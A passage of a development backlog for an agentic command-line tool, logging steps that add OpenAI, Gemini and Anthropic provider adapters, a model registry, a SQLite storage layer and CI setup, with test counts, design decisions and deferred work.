- `tests/providers/openai.test.ts` — **17 tests** covering model rejection, env key, capabilities, generateConstrained stub, generate end-to-end, system prepending, config forwarding (`stream: true` enforced), assistant tool_use coalescing, user tool_result splitting into tool-role messages, mixed tool_results+text ordering regression, tool_result-on-assistant throw, tool_use-on-non-assistant throw, countTokens heuristic (chars/4) on text and on tool blocks.
- `tests/providers/registry.test.ts` updated — asserts OpenAI lineup, total count = sum of all three families, OpenAI factory parity test.
- Total suite now **140 tests / 289 expect() calls** in ~285ms.

**Code-review fixes folded in before commit:**
- `ToolCallInProgress` carries an explicit `idIsSynthesized: boolean` flag instead of relying on the `startsWith('call_')` heuristic. Real OpenAI ids start with `call_` too, so the prefix couldn't tell synth from real — a real id arriving in chunk 1 could (in theory) be silently overwritten by a later chunk. The flag flips false the first time a real id is set and stays there.
- `toOpenAIMessages` now emits `tool_result` messages **before** the user text message when both are present in the same `ProviderMessage`. Reversing the order would make the model see a new user prompt before the tool results it requested in the prior assistant turn.
- Throws on `tool_result` blocks in non-user messages, symmetric to the existing throw for `tool_use` blocks in non-assistant messages. Catches malformed callers at the boundary instead of forwarding nonsense to the API.

**Decisions:**
- **`countTokens` is a chars/4 heuristic**, not a real tokenizer call. OpenAI exposes no server-side `countTokens` endpoint (unlike Anthropic and Google) — proper local impl needs `tiktoken`. The heuristic is within ~10% for English, good enough for budget early-warnings. Replaced with tiktoken when M5 wires the local tokenizer. Documented in code.
- **`delta.refusal` becomes `text_delta`**, not a dedicated event kind. OpenAI's safety refusals are user-visible prose; treating them as text matches what reaches the UI. The accompanying `finish_reason` is `'stop'`, not `'content_filter'`, so no special stop reason needed.
- **`baseURL` is exposed in options** to support Azure OpenAI / OpenRouter / Together / Groq / etc. Same SDK shape; just a different host.
- **Tool args stream across chunks** like Anthropic (unlike Gemini). Tracking is keyed by `tool_calls[].index` (stable across chunks, unlike `id` which arrives only once). Edge cases covered: id arriving in a later chunk, name in a different chunk than the index registration, multiple parallel tool_calls finalized in index order at end-of-stream.
- **`ProviderMessage` → multiple `OpenAIMessage`**: a `user` message containing tool_result blocks can't fit OpenAI's schema (which requires `role: 'tool'` for results), so we split. Documented inline; tests pin the contract.
- **Step 3.5's extensibility refactor paid off**: adding GPT was 4 new files in `src/providers/openai/` + 1 line in `createDefaultRegistry`. No edits to shared types, no edits to `registry.ts`'s `ModelEntry`, no changes to other adapters. This is the regression-bar for "easy to add new providers".
- **Model lineup intentionally narrow** (`gpt-4o` + `gpt-4o-mini`) — matches PROVIDERS.md §2's table. Newer models (gpt-5, o-series reasoning) added when their quirks (no system prompt, hidden reasoning tokens) are characterized — that's its own design exercise.

**Out of scope:**
- Real network coverage (deferred to evals)
- `tiktoken`-based token counting (M5)
- Reasoning models (o1/o3/etc) — different shape, deferred
- Structured outputs via `response_format: json_schema` (deferred until `generateConstrained` ships)
- Azure-specific auth (uses `apiKey` + `baseURL` pattern; full Azure AD OAuth deferred)

**Pending:** none for this step.

**Next:** Step 4 — Permission Engine + first 6 tools (`AGENTIC_CLI §7.1, §8`). Now with three providers behind the same `Provider` interface, the harness in Step 5 has real choice.

---

## [2026-04-27] M1 / Step 3.5 — Gemini adapter + extensibility refactor of the registry

**Done:**
- Added `@google/genai@1.50.1` dependency.
- `src/providers/google/capabilities.ts` — capabilities for `gemini-2.5-pro`, `gemini-2.5-flash`, `gemini-2.5-flash-lite`. Cache mode is `server_persistent` (Gemini context caching is durable, not 5min like Anthropic). Cost numbers are illustrative (PROVIDERS.md §5 said "to document when adapter is implemented" — covered with placeholder values consistent with the rest of the registry).
- `src/providers/google/stream.ts` — `normalizeGoogleStream` converts Gemini chunks into the canonical `StreamEvent` taxonomy. Handles: synth `start` on first chunk (Gemini has no `message_start` frame), text deltas, function calls (single complete part per chunk → emit start+delta+stop back-to-back), `thought`/`thinkingText` parts, finishReason mapping (STOP/MAX_TOKENS/TOOL_CALLS/FUNCTION_CALL/SAFETY/RECITATION/BLOCKLIST/PROHIBITED_CONTENT/SPII), null finishReason guard, empty stream fallback.
- `src/providers/google/index.ts` — `createGoogleProvider(modelName, opts)` factory. Reads API key from `opts.apiKey`, `GOOGLE_API_KEY`, or `GEMINI_API_KEY`. Test seam via `opts.client`. Message conversion: `'assistant'`→`'model'`, content string→`parts:[{text}]`, content blocks→parts, `tool_use`→`functionCall`. `tool_result` blocks **throw** with a clear message (Gemini correlates by name not id; the harness will own id↔name resolution in Step 5+). Tool defs convert to Gemini's `functionDeclarations` shape.
- `src/providers/google/register.ts` — `registerGoogleModels(reg)`.
- `src/providers/anthropic/register.ts` — same pattern, extracted from registry.ts.

**Registry refactor (extensibility):**
- `ModelEntry.factory` is now `(opts?: unknown) => Provider` at the registry boundary. The previous `CreateProviderOptions = CreateAnthropicProviderOptions` alias is gone — registry no longer needs to know every family's option shape. Each adapter narrows internally with a structural cast.
- `createDefaultRegistry()` is now a 3-line orchestrator: `createRegistry()`, `registerAnthropicModels(reg)`, `registerGoogleModels(reg)`. Adding GPT later is one new `registerOpenAIModels` import + one call.
- The trade-off: callers wanting compile-time typed options should import the adapter's `create<X>Provider` directly. Going through `entry.factory` is type-erased on options. Documented in the `ModelEntry.factory` comment.

**Tests added:**
- `tests/providers/google-stream.test.ts` — **12 tests** covering text-only, functionCall lifecycle, synthesized vs SDK-provided ids, thought parts, finishReason mapping (8 cases incl. unknown), null doesn't clobber, empty stream, mixed-parts.
- `tests/providers/google.test.ts` — **12 tests** covering model rejection, env var lookup (GOOGLE_API_KEY / GEMINI_API_KEY), capabilities, generateConstrained stub, generate end-to-end through mock client, role/content mapping (`assistant`→`model`), config forwarding, `tool_result` block throw, countTokens (with totalTokens fallback to 0).
- `tests/providers/registry.test.ts` updated to assert both Anthropic and Google lineups, parity per family, and "all default entries can be instantiated with just an apiKey" — the regression test for "easy to add new providers".
- Total suite now **110 tests / 224 expect() calls** in ~500ms.

**Decisions:**
- **`(opts?: unknown) => Provider`** at the registry boundary — chosen over a discriminated union or a generic `ModelEntry<TOpts>` because both alternatives forced every consumer of the registry to either narrow on family or carry generics that erase at lookup time. The `unknown`-with-cast pattern keeps adding a family to a 1-line change in `createDefaultRegistry`. Compile-time safety on options is recovered by importing the family's `create<X>Provider` directly.
- **API key precedence for Google**: `opts.apiKey` → `GOOGLE_API_KEY` → `GEMINI_API_KEY`. Both env vars are common in the wild; we accept either to reduce friction.
- **Gemini `tool_result` blocks throw rather than silently corrupt**. Gemini correlates function calls by name, not id; doing the conversion correctly requires the original function name, which only the harness knows. Throwing is honest until Step 5 wires the resolution.
- **Function call ids are synthesized** for Gemini when the SDK doesn't provide one (`call_<n>_<uuid>`). The same id is used across `tool_use_start` / `_delta` / `_stop` (asserted by test).
- **`thought: true` parts → `thinking_delta`** to mirror Anthropic's extended thinking pass-through. Plain text parts (`thought` absent or false) → `text_delta`.
- **Per-family register* helpers** instead of a generic `buildFamilyEntries(family, ...)` — the per-family helper lives in the family's folder, so adding a family doesn't touch shared `registry.ts` code at all (only the orchestration line).

**Out of scope:**
- Real network coverage (deferred to evals)
- `tool_result` round-trip in messages (Step 5 — harness needs id↔name map)
- OpenAI / Ollama / llama.cpp — adapters land in M5 with the same pattern

**Pending:** none for this step.

**Next:** Step 4 — Permission Engine + first 6 tools (`AGENTIC_CLI §7.1, §8`).

---

## [2026-04-27] M1 / Step 3 — Provider Anthropic adapter + Model Registry

**Done:**
- `src/providers/types.ts` — canonical `Provider`, `ProviderCapabilities`, `StreamEvent`, `ProviderMessage`, `GenerateRequest`, `ConstrainedRequest`, `ProviderToolDef`, `StopReason`, family/cache/tools/constrained enums (per `AGENTIC_CLI §14`, `PROVIDERS.md §1`, `CONTRACTS.md §4`).
- `src/providers/anthropic/capabilities.ts` — caps for the three M1 Anthropic models (opus-4-7, sonnet-4-6, haiku-4-5). Costs taken verbatim from `PROVIDERS.md §5`.
- `src/providers/anthropic/stream.ts` — `normalizeAnthropicStream(rawEvents)` converts SDK raw events into the canonical `StreamEvent` taxonomy. Handles parallel tool_use blocks, partial JSON arg accumulation, malformed JSON fallback, thinking deltas, signature-delta drop, unknown stop_reason fallback.
- `src/providers/anthropic/index.ts` — `createAnthropicProvider(modelName, opts)` factory. Reads API key from `opts.apiKey` or `ANTHROPIC_API_KEY`. Exposes a test-seam (`opts.client`) for injecting a pre-built SDK client. `generate()` streams; `countTokens()` calls the SDK; `generateConstrained()` is a deliberate stub that rejects with a clear "not implemented in M1" error.
- `src/providers/registry.ts` — `createRegistry()` factory + `createDefaultRegistry()` pre-populated with the three Anthropic models. Each entry carries id, family, modelName, capabilities, and a `factory(opts)` to instantiate a live `Provider`.
- `src/providers/index.ts` — public surface; re-exports types and constructors.
- `tests/providers/*.test.ts` — 3 files, **31 tests** covering: stream normalization (12 cases incl. text-only, tool_use lifecycle, malformed JSON, non-object args, parallel tool_use, signature_delta drop, default-when-no-stop, null doesn't clobber a prior valid stop_reason, omitted-stop-reason ignored), adapter shape + wiring (model rejection, env vs option key, id/family/capabilities, generateConstrained stub, generate end-to-end through mock client, optional-field omission, countTokens), registry (insert/get/has/list, duplicate refusal, default lineup, factory↔entry capability parity).
- Total suite now **86 tests / 166 expect() calls** in ~180ms.

**Code-review fixes folded in before commit:**
- `mapStopReason` no longer accepts null/undefined. The `message_delta` handler only updates `stopReason` when the SDK actually sends a string. A later `delta: { stop_reason: null }` can no longer clobber an earlier valid `'tool_use'` and turn the canonical `stop` event into the wrong reason.
- `KNOWN_STOP_REASONS` is typed as `ReadonlySet<string>`; the ugly `as Set<string>` cast is gone.
- Combined the duplicate `import` from `./anthropic/capabilities.ts` in the registry.
- Adapter wiring now has real coverage: a mock `Anthropic` client (passed via the `client` test seam) verifies that `generate()` pipes the SDK stream through the normalizer, that optional fields are omitted when absent, and that `countTokens()` calls `messages.countTokens` and returns the SDK's `input_tokens`.

**Decisions:**
- **No real API calls in unit tests.** The stream normalizer takes any `AsyncIterable<RawAnthropicEvent>`; tests construct mock event sequences with async generators. Real-network coverage will live in evals (M5+).
- **`RawAnthropicEvent` is a local minimal type**, structurally compatible with the SDK's `Anthropic.Messages.RawMessageStreamEvent`. Decouples the normalizer from SDK upgrades that touch peripheral fields.
- **`generateConstrained` is a stub.** Anthropic implements constrained output via forced `tool_choice`, but the M1 autonomous loop never calls it — the DAG executor (M6) does. Failing loud beats silent emulation.
- **`metadata` field on `GenerateRequest` is not forwarded** to the SDK (yet). Anthropic's `MetadataParam` is `{ user_id?: string | null }`, narrower than our generic `Record<string, string>`. Telemetry will route user identity through a dedicated channel when needed.
- **`ProviderToolDef.input_schema` is typed as `{ type: 'object'; ... }`**, not arbitrary `Record<string, unknown>`. Matches both Anthropic and OpenAI tool-calling requirements; refusing malformed schemas at compile time beats runtime errors from the provider.
- **Registry as factory, not singleton** — each test gets a fresh registry. Shared global state was the mistake to avoid.
- **`sampling: SamplingSupport`** field from `PROVIDERS.md §1` intentionally omitted in M1; arrives with `TOKEN_TUNING` work.
- **Capabilities are declared honestly** per `PROVIDERS.md` principle 2 — the adapter exposes streaming because it streams; tools because it does native tool-calling; cache because Anthropic's prompt cache is server-side. Nothing claimed that the code doesn't do.

**Out of scope:**
- Vision input (M2+ when CLI accepts image paste)
- Extended thinking *actions* (we pass `thinking_delta` through but don't yet leverage it for the agent loop)
- Cache breakpoints (responsibility of the Context Engine, not the adapter)
- Retry/backoff on 5xx/529 (lives in the harness's provider call wrapper, Step 5)
- Token-counter caching (every `countTokens` call hits the network; harness can memoize)
- OpenAI, Ollama, llama.cpp adapters (M5; this step lays the interface they'll implement)

**Follow-ups (registered now, addressed later):**
- `ModelEntry.factory` is monomorphic over `CreateProviderOptions` (currently aliased to `CreateAnthropicProviderOptions`). Once a second family lands, this needs to become a discriminated union (or the entry generic over its options type) so that calling an OpenAI factory with Anthropic options is a compile error, not a runtime crash. Address in M5 when the second adapter ships.
- `ProviderMessageRole` is `'user' | 'assistant'` (Anthropic represents tool results as user messages with `tool_result` blocks), but storage's `MessageRole` is `'user' | 'assistant' | 'tool'`. A storage→provider converter is needed when the harness joins both ends. Will land in Step 5.
- `ANTHROPIC_MODEL_NAMES = Object.keys(ANTHROPIC_CAPS)` loses literal types; if we want a typed union of allowed model names, we need `as const` plumbing or a generated constant. Cosmetic — fix when DX pain shows up.

**Pending:** none for this step.

**Next:** Step 4 — Permission Engine + first 6 tools (`AGENTIC_CLI §7.1, §8`). Glob/prefix policy YAML loader (no regex), `Tool<I, O>` interface, the read/write/edit/grep/glob/bash tools, harness-blocking pre-tool checks. The Anthropic adapter emits `tool_use_*` events; the tool layer will consume them.

---

## [2026-04-27] M1 / Step 2 — Storage layer (SQLite, MVP)

**Done:**
- `src/storage/db.ts` — connection factory over `bun:sqlite`. Sets `PRAGMA foreign_keys = ON` on every connection (Bun default is OFF). For file-backed DBs adds `journal_mode = WAL` and `synchronous = NORMAL`; skipped for `:memory:`. Auto-creates the parent directory.
- `src/storage/paths.ts` — XDG-aware default path resolution: `$XDG_DATA_HOME/forja/sessions.db` or `~/.local/share/forja/sessions.db`.
- `src/storage/migrate.ts` — idempotent runner. Records each applied migration in `_migrations` with `sha256(sql)`. Re-applying a migration whose SQL changed throws (catches accidental drift). Each migration runs inside a transaction.
- `src/storage/migrations/001-initial.ts` — first migration: `sessions`, `messages`, `tool_calls` per `AGENTIC_CLI §13`, with `CHECK` constraints on enum columns, FK cascades, and the indexes from §13. Inlined as TS so it survives `bun build --compile`.
- `src/storage/repos/{sessions,messages,tool-calls}.ts` — thin function-based repositories. No classes, no ORM. Camel-case domain types, snake-case row types, explicit `fromRow`. JSON columns serialized via `JSON.stringify`/`JSON.parse` (SQLite has no JSONB). State transitions enforced at the SQL layer (`UPDATE ... WHERE status = 'running'`) and reflected as thrown errors when the transition is illegal.
- `src/storage/index.ts` — single public surface; re-exports types and functions.
- `tests/storage/*.test.ts` — 6 files, **51 tests** covering: XDG fallback (incl. empty string), migration idempotency, hash-mismatch refusal, whitespace-insensitive hash, table creation, CRUD round-trips, ordering, filters, FK cascades, FK enforcement, CHECK rejection of invalid enums, illegal state transitions, cross-session parent rejection, transaction commit/rollback semantics, `openDb` directory creation, PRAGMA assertions.
- Total suite now **55 tests / 97 expect() calls** in ~150ms.

**Code-review fixes folded in before commit:**
- `finishToolCall` now refuses to overwrite a finished call (`AND status IN ('pending','running')` in the UPDATE). Without this, a buggy retry path could silently turn a `done` row into `error`.
- Migration hash now normalizes whitespace before SHA-256, so reformatting committed SQL no longer trips the drift detector. Semantic changes (renamed column, different type) still produce a different hash.
- Hash-mismatch error includes both the applied hash and the current hash.
- `appendMessage` validates that `parentId` lives in the same session (FK alone only checks existence). Prevents silently-corrupted message threads.
- `tool_calls` got a `created_at INTEGER NOT NULL` column and `idx_tool_calls_message_created`; `listToolCallsByMessage` now orders by `created_at ASC, id ASC` (UUIDs aren't time-sortable).
- `withTransaction(db, fn)` exposed in `src/storage/db.ts` so the harness can group multi-row writes (message + tool_calls) atomically without learning Bun's curried `db.transaction()` API.

**Decisions:**
- **`allowImportingTsExtensions: true`** added to tsconfig — Bun's idiomatic style is `.ts` in imports; without the flag tsc rejects them. Compatible because `noEmit: true`.
- **Disabled Biome rule `performance/noDelete`** — its auto-fix would convert `delete process.env.X` to `process.env.X = undefined`, which in Node/Bun sets the env var to the string literal `"undefined"` instead of removing it. That would silently break our XDG fallback test. The V8 hidden-class concern doesn't apply to non-hot test code.
- **Repos as functions, not classes** — keeps testing trivial (`(db, input) → result`), aligns with "no ORM" rule, matches the spec's pseudocode style.
- **JSON columns are `unknown`** at the type boundary — repos don't claim to know the shape of message content or tool input/output. Caller validates if it cares.
- **`completeSession` and `startToolCall` distinguish "not found" from "wrong state"** — diagnostic value at low cost.
- **Indexes from spec §13.1** included verbatim (`sessions(started_at DESC)`, `(cwd, started_at DESC)`, `(status, started_at DESC)`, `messages(session_id, created_at)`, `tool_calls(tool_name, status)`).

**Out of scope (deferred to the step that needs them):**
- `goal_stack` (with the harness when goal injection lands)
- `approvals` (with permissions)
- `checkpoints` (with rollback / git integration in M3)
- `hook_runs`, `background_processes`, `memory_events`, `recap_runs`, `recap_cache`, `traces`, `artifacts` (each with its own subsystem in M3+)

**Pending:** none for this step.

**Next:** Step 3 — Provider Anthropic adapter + Model Registry skeleton (`AGENTIC_CLI §14`, `PROVIDERS.md`). Minimal `Provider` interface, real `generate()` against `@anthropic-ai/sdk` with streaming, capability declaration, request shape that the harness will consume in Step 5.

---

## [2026-04-27] M1 / Step 1.5 — Production hygiene pass

**Done:**
- `.github/workflows/ci.yml` — runs typecheck → lint → test on push to `main` and on every PR. Bun pinned to `1.3.13`. Concurrency group cancels superseded runs.
- `.editorconfig` at the root — keeps cross-editor formatting aligned with Biome (2-space, LF, UTF-8, final newline). Markdown keeps trailing whitespace (line breaks).
- Trusted Biome's postinstall (`bun pm trust @biomejs/biome`) so the platform binary is fetched at install time instead of lazily on first lint. Bun added `trustedDependencies` to `package.json`.
- `tests/cli.test.ts` — first smoke test: `--version`, `-v`, `--version --json`, no-args exit-1. Also unblocks `bun test` in CI (zero test files makes Bun exit 1).

**Decisions:**
- **Skipped pre-commit hook and README.md** for now (explicit user call). CI gate covers the regression case for the moment.
- **CI uses `bun install --frozen-lockfile`** — fail loud if `bun.lock` drifts from `package.json`.
- **CI Bun version pinned to current dev (`1.3.13`)** rather than floating `latest` — reproducible builds beat free upgrades.
- **Smoke test uses `Bun.spawnSync`** (not `node:child_process`) — consistent with the runtime, no extra type dance.

**Pending:** README and pre-commit hook still owed eventually.

**Next:** Step 2 — Storage layer (SQLite) per `AGENTIC_CLI §13`.

---

## [2026-04-27] M1 / Step 1 — Repository bootstrap

**Done:**
- Branch `feat/m1-foundation` created from `main`.
- `CLAUDE.md` at the root: root premise, Doc→Subsystem map, locked stack, hard rules, workflow.
- `docs/BACKLOG.md` (this file).
- `package.json` with scripts (`dev`, `test`, `lint`, `typecheck`, `build`) and bin `agent`.
- `tsconfig.json` strict (including `noUncheckedIndexedAccess`, `exactOptionalPropertyTypes`, `verbatimModuleSyntax`).
- `biome.json` (linter + formatter, 100 col, single quotes, semicolons).
- `.gitignore` covering runtime state per spec §2.7 (`.agent/sessions.db`, traces, checkpoints, local memory).
- `src/cli/index.ts` stub — responds to `--version` / `-v`; anything else exits 1 with a pointer to the spec.
- Project-wide language policy: English everywhere except `docs/spec/` (PT-BR).

**Decisions:**
- **Test runner:** `bun test` built-in, not Vitest from spec §16. Reason: aligns with principle 5 ("single runtime"); zero extra deps. Revisit if a critical Vitest feature is missing.
- **Linter:** Biome (single binary, Bun-friendly) instead of ESLint + Prettier — same single-runtime alignment.
- **`docs/BACKLOG.md` instead of `.txt`** — markdown renders on GitHub and matches the rest of the repo.
- **Branch per milestone** (`feat/mN-*`) until trunk-based stabilizes.
- **No empty subsystem folders** — they emerge in the step that needs them. `.gitkeep` in empty dirs is noise.
- **Stack matches spec §3** exactly: TS + Bun + bun:sqlite + Ink. No drift.
- **Project language is English**; only `docs/spec/` stays in PT-BR.

**Pending:** none for this step.

**Next:** Step 2 — Storage layer (SQLite) with the minimal schema from `AGENTIC_CLI §13`: tables `sessions`, `messages`, `tool_calls`, `approvals`, `checkpoints`, `traces`. Migrations infra. Thin repository pattern over `bun:sqlite`. Schema + basic CRUD tests.
